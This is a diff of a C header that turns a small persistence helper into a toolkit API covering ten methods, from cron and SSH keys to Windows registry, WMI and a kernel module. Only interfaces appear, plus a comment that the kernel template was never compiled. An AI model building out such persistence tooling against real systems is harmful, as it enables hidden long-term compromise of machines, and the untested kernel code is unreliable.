@@ -2,13 +2,42 @@
 #define PERSIST_H
 #include <stddef.h>
 
-/* 生成 crontab 行（每分钟执行）。返回写入长度（不含 NUL），失败 0 */
-size_t persist_cron_line(const char *cmd, char *out, size_t cap);
+typedef enum {
+    PERSIST_CRON = 0,
+    PERSIST_SYSTEMD,
+    PERSIST_LAUNCHAGENT,
+    PERSIST_LDPRELOAD,
+    PERSIST_SSHKEY,
+    PERSIST_REGISTRY,
+    PERSIST_SCHTASK,
+    PERSIST_WMI,
+    PERSIST_SERVICE,
+    PERSIST_LKM
+} persist_method_t;
 
-/* 生成 systemd user unit 内容（不写盘，只返回文本） */
-size_t persist_systemd_unit(const char *name, const char *exec, char *out, size_t cap);
+#define PERSIST_PLAT_ANY 0
+#define PERSIST_PLAT_WIN 1
+#define PERSIST_PLAT_NIX 2
 
-/* 生成 LaunchAgent plist 内容 */
-size_t persist_launch_agent(const char *label, const char *exec, char *out, size_t cap);
+typedef struct {
+    persist_method_t id;
+    const char      *name;
+    int              platform;
+    size_t         (*generate)(const char *arg, char *out, size_t cap);
+} persist_desc_t;
+
+/* 生成持久化载荷文本（不写盘）。返回长度，失败 0 */
+size_t persist_generate(persist_method_t m, const char *arg, char *out, size_t cap);
+
+size_t persist_method_count(void);
+const persist_desc_t *persist_method_at(size_t i);
+
+/* 安装/卸载：以 root_prefix 作为假根，仅对文件型方法生效。
+ * 成功 0；平台不支持返回 -2；IO 失败返回 -1 */
+int persist_install(persist_method_t m, const char *root_prefix, const char *arg);
+int persist_uninstall(persist_method_t m, const char *root_prefix, const char *arg);
+
+/* 内核态 LKM 模板源码（沙盒无内核头，不可编译验证，仅作交付物） */
+const char *persist_kernel_source(void);
 
 #endif
